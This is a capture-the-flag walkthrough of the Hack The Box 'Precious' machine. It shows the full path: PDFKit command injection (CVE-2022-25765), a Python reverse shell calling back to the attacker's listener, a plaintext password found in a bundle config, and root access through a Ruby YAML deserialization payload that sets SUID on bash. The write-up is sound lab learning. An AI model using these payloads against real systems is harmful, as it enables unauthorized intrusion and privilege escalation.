# Hack The Box - Precious Walkthrough 

## Reconnaissance
Retrieving the IP address of the machine, I started a quick inital Nmap scan to see which ports are open and which services are running on those ports.
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Precious]
└─$ sudo nmap -sC -sV -O -oN nmap/initial 10.10.11.189
[sudo] password for darshan: 
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-28 01:05 EST
Nmap scan report for 10.10.11.189
Host is up (0.43s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 84:5e:13:a8:e3:1e:20:66:1d:23:55:50:f6:30:47:d2 (RSA)
|   256 a2:ef:7b:96:65:ce:41:61:c4:67:ee:4e:96:c7:c8:92 (ECDSA)
|_  256 33:05:3d:cd:7a:b7:98:45:82:39:e7:ae:3c:91:a6:58 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://precious.htb/
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=1/28%OT=22%CT=1%CU=30740%PV=Y%DS=2%DC=I%G=Y%TM=63D4BB6
OS:F%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)SEQ
OS:(SP=108%GCD=1%ISR=109%TI=Z%CI=Z%TS=9)OPS(O1=M537ST11NW7%O2=M537ST11NW7%O
OS:3=M537NNT11NW7%O4=M537ST11NW7%O5=M537ST11NW7%O6=M537ST11)WIN(W1=FE88%W2=
OS:FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M537NNSN
OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W
OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R
OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.89 seconds
                                                            
```

So I ran `Rustscan` that covers all ports. The idea behind using `Rustscan` is that it is faster compared to Nmap since `Rustscan` using Multi-threading but doesnt have service, OS, script scan features. So, I basically used `Rustscan` to find open ports and If I find them, i'll only scan those ports for services, version & OS detection using Nmap, making it faster and much efficient.
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Precious]
└─$ rustscan -a 10.10.11.189 --range 1-65535
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.11.189:22
Open 10.10.11.189:80
[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 22,80 10.10.11.189

Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-28 01:07 EST
Initiating Ping Scan at 01:07
Scanning 10.10.11.189 [2 ports]
Completed Ping Scan at 01:07, 0.24s elapsed (1 total hosts)
Initiating Connect Scan at 01:07
Scanning precious.htb (10.10.11.189) [2 ports]
Discovered open port 80/tcp on 10.10.11.189
Discovered open port 22/tcp on 10.10.11.189
Completed Connect Scan at 01:07, 0.65s elapsed (2 total ports)
Nmap scan report for precious.htb (10.10.11.189)
Host is up, received syn-ack (0.31s latency).
Scanned at 2023-01-28 01:07:26 EST for 1s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.94 seconds
```

So, after looking at results of `Nmap` and `Rustscan`, I found the following 2 ports open:
- Port `22`: running `OpenSSH 8.4p1`.
- Port `80`: running `nginx 1.18.0`.

There was one more interesting thing indicated by `nmap` for port `80`
```
80/tcp open  http    nginx 1.18.0
...
http-title: Did not follow redirect to http://precious.htb/
```

Due to this indiacation by `nmap`, I knew that I had to add the IP address of machine, along with `precious.htb` to the `/etc/hosts` file.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Precious]
└─$ cat /etc/hosts                            
127.0.0.1       localhost
127.0.1.1       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
...
10.10.11.189  precious.htb
...
```

## Enumeration
Visiting the web-site on port `80`, there's a simple `web page convertor` which takes the `URL` as an input and gives us a `PDF` as an output

![pr-1](https://user-images.githubusercontent.com/87711310/215252219-87066a88-ca18-42ff-bde8-8d1cb54ad2dc.png)

So, now I had a wierd idea, to enter website's own IP address as the input to see how the web-site would behave, and I got an error saying `cannot load remote URL`.

![pr-2](https://user-images.githubusercontent.com/87711310/215252218-3cab893a-a60f-4a7e-aea8-fb949878c430.png)


So, now I hosted a webserver on one of my directories and and tried to transfer a simple nmap file to see the output of the file given by the website.
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Precious]
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.189 - - [28/Jan/2023 01:10:24] "GET /nmap HTTP/1.1" 301 -
10.10.11.189 - - [28/Jan/2023 01:10:25] "GET /nmap/ HTTP/1.1" 200 -
```

On the website, I inputted my machine IP along with port number and the name of the file and clicked enter.

![pr-3](https://user-images.githubusercontent.com/87711310/215252221-8cd72b8d-282d-4e05-afd9-bce3b961d40c.png)

I immediately got back a `download prompt`, so I downloaded and saved the file, copied it to my directory and used `exiftool` to view the `metadata` of the file.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Precious]
└─$ exiftool 0vb594wjvrmcmuckheav8wl5uzbfehbi.pdf 
ExifTool Version Number         : 12.44
File Name                       : 0vb594wjvrmcmuckheav8wl5uzbfehbi.pdf
Directory                       : .
File Size                       : 17 kB
File Modification Date/Time     : 2023:01:28 01:15:38-05:00
File Access Date/Time           : 2023:01:28 01:15:42-05:00
File Inode Change Date/Time     : 2023:01:28 01:15:38-05:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 1
Creator                         : Generated by pdfkit v0.8.6

```

I wasn't sure what pdfkit was, so I googled it and found out that 
```
PDFKit is a PDF document generation library for Node and the browser that makes creating complex, multi-page, printable documents easy.
```

So, now I tried to find exploits for it, and with a simple google search, I found a very recent exploit of `pdfkit` which was a `command injection` vulnerability. You can read more about [CVE-2022–25765](https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795)

![pr-google](https://user-images.githubusercontent.com/87711310/215252213-edbe4fc5-2486-4894-b429-1c979456accf.png)

So next, I tried to understand how to exploit the vulnerability and it was fairly simple. According to the CVE, `an application could be vulnerable if it tries to render a URL that contains query string parameters with user input` and `if the provided parameter happens to contain a URL encoded character and a shell command substitution string, it will be included in the command that PDFKit executes to render the PDF`. This has got to be our way in!

So, basically, we can use any `get` parameter name and inside that use the `backticks` to inject our command.

So, I started with basic `id` command to see it the web-site is actually vulnerable to 
 
```
http://IP/?name=%20`id`
```

![pr-4](https://user-images.githubusercontent.com/87711310/215252849-3fbec9e7-22a3-4ee8-864a-1c566bd6eb01.png)

And, this is the result I got after viewing the file

![pr-5](https://user-images.githubusercontent.com/87711310/215252848-aca8ab08-6e13-49ce-8fb2-9f91e1e40ec0.png)

Now, that I know this web-site is also vulnerable to `CVE-2022–25765`, I used a simple python reverse shell to get a reverse shell on my mahcine

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.XX.XX",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

So, the final payload to get a reverse shell was:
```python
http://Machine IP:port/?name=%20`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.XX.XX",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'`
```

Before sending the request, I turned on my `netcat` listener to receive the incomign request, and once I hit send on the website, I immediately got back a reverse shell.

```
┌──(darshan㉿kali)-[~]
└─$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.11.189] 46240
$ whoami
whoami
ruby
...
```

Then, I upgraded the shell to an interactive shell using the following command: 
```
$ python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
sh: 2: python: not found
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
ruby@precious:/var/www/pdfapp$ 
```

NOTE: `Python2` doesnt work on this machine, so use `Python3` instead.

Notice that we are logged in as a `ruby` user and going in the `/home` directory, I found out that there were 2 users: `ruby` & `henry`

So, I went into `ruby's` directory first, and looked at all the files in ruby's directory and found an interesting directory.

```
ruby@precious:~$ ls -la
ls -la
total 28
drwxr-xr-x 4 ruby ruby 4096 Jan 28 01:08 .
drwxr-xr-x 4 root root 4096 Oct 26 08:28 ..
lrwxrwxrwx 1 root root    9 Oct 26 07:53 .bash_history -> /dev/null
-rw-r--r-- 1 ruby ruby  220 Mar 27  2022 .bash_logout
-rw-r--r-- 1 ruby ruby 3526 Mar 27  2022 .bashrc
dr-xr-xr-x 2 root ruby 4096 Oct 26 08:28 .bundle
drwxr-xr-x 3 ruby ruby 4096 Jan 28 01:08 .cache
-rw-r--r-- 1 ruby ruby  807 Mar 27  2022 .profile
ruby@precious:~$ cd .bundle
cd .bundle

```

Visiting the `.bundle` directory, I found a `config` file which contained the `username:password` of `henry`
```
ruby@precious:~/.bundle$ ls
ls
config
ruby@precious:~/.bundle$ cat config
cat config
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"

```

Using this information, I tried to log in through `ssh` as `henry` and to my surprise, I was able to log in.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Precious]
└─$ ssh henry@10.10.11.189
The authenticity of host '10.10.11.189 (10.10.11.189)' can't be established.
ED25519 key fingerprint is SHA256:1WpIxI8qwKmYSRdGtCjweUByFzcn0MSpKgv+AwWRLkU.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.189' (ED25519) to the list of known hosts.
henry@10.10.11.189's password: 
Linux precious 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
henry@precious:~$ ls
user.txt
henry@precious:~$ cat user.txt
[REDACTED]
```

I was also able to retrieve the `user` flag

## privilege Escalation
Once I got the `user` flag, I had to escalate my privileges to get the `root` flag. So I started with `sudo -l` to check if I had any permission to run any services or a file as a `sudo` user and I got one.

```
henry@precious:~$ sudo -l
Matching Defaults entries for henry on precious:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```

So, I could run `update_dependencies.rb` file as a `root` user

So, I went on to check out the code for this file

```rb
henry@precious:~$ cat /opt/update_dependencies.rb
# Compare installed dependencies with those specified in "dependencies.yml"
require "yaml"
require 'rubygems'

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read("dependencies.yml"))
end

def list_local_gems
    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
end

gems_file = list_from_file
gems_local = list_local_gems

gems_file.each do |file_name, file_version|
    gems_local.each do |local_name, local_version|
        if(file_name == local_name)
            if(file_version != local_version)
                puts "Installed version differs from the one specified in file: " + local_name
            else
                puts "Installed version is equals to the one specified in file: " + local_name
            end
        end
    end
end

```

On closely viewing the code, I found out that the code was using `YAML load()`

Now, if you google a lil bit about `Yaml load()` issues, you'll find out that it is vulnerable to `YAML Deserialization Attack`. You can read more about `YAML Deserialization Attacks` [here](https://github.com/DevComputaria/KnowledgeBase/blob/master/pentesting-web/deserialization/python-yaml-deserialization.md)

So, after reading the `how to exploit YAML Deserialiaztion vulnerabilities`, I found out that we need to craft a payload inside a `yml` file called `dependencies.yml`. Using the following payload, I created the file in `/henry` directory, changing the `git_set` to `id`, to check if the exploit is actually working.

```rb
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: id
         method_id: :resolve
```

I created the `dependencies.yml` and copy pasted the paylaod inside the file.

![pr-6](https://user-images.githubusercontent.com/87711310/215254245-24802f13-5552-4ff5-87af-f4c4964c9467.png)

Now, I ran the file and we got back the results!!

```
henry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb
sh: 1: reading: not found
uid=0(root) gid=0(root) groups=0(root)
...
```

You might get a `traceback` error but it doesn't matter as we got back out results and can confirm that this exploit is working.

So, now I went on and changed the `git_set: "id"` command to `git_set: "chmod +s /bin/bash"`

```
henry@precious:~$ nano dependencies.yml 
henry@precious:~$ cat dependencies.yml 
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: "chmod +s /bin/bash"
         method_id: :resolve

```

And ran the command with `sudo`

```
henry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb
sh: 1: reading: not found
Traceback (most recent call last):
        33: from /opt/update_dependencies.rb:17:in `<main>'
        32: from /opt/update_dependencies.rb:10:in `list_from_file'
        31: from /usr/lib/ruby/2.7.0/psych.rb:279:in `load'
        30: from /usr/lib/ruby/2.7.0/psych/nodes/node.rb:50:in `to_ruby'
        29: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
        28: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
        27: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
        26: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:313:in `visit_Psych_Nodes_Document'
        25: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
        24: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
        23: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
        22: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:141:in `visit_Psych_Nodes_Sequence'
        21: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `register_empty'
        20: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `each'
        19: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `block in register_empty'
        18: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
        17: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
        16: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
        15: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:208:in `visit_Psych_Nodes_Mapping'
        14: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:394:in `revive'
        13: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:402:in `init_with'
        12: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:218:in `init_with'
        11: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:214:in `yaml_initialize'
        10: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:299:in `fix_syck_default_key_in_requirements'
         9: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_reader.rb:59:in `each'
         8: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_header.rb:101:in `from'
         7: from /usr/lib/ruby/2.7.0/net/protocol.rb:152:in `read'
         6: from /usr/lib/ruby/2.7.0/net/protocol.rb:319:in `LOG'
         5: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `<<'
         4: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write'
         3: from /usr/lib/ruby/vendor_ruby/rubygems/request_set.rb:388:in `resolve'
         2: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `<<'
         1: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write'
/usr/lib/ruby/2.7.0/net/protocol.rb:458:in `system': no implicit conversion of nil into String (TypeError)
henry@precious:~$ whoami
henry
```

After seeing the results, you might think that the exploit has not worked, but ig uyou look at `/binbash` binary, you can see that it has `SUID` permission 

So, we can just use `/bin/bash -p` to get `root`

```
henry@precious:~$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1234376 Mar 27  2022 /bin/bash
henry@precious:~$ /bin/bash -p
bash-5.1# whoami
root
bash-5.1# cat /root/root.txt
[REDACTED]
```

So, we can submit the flag, and complete the box!!!
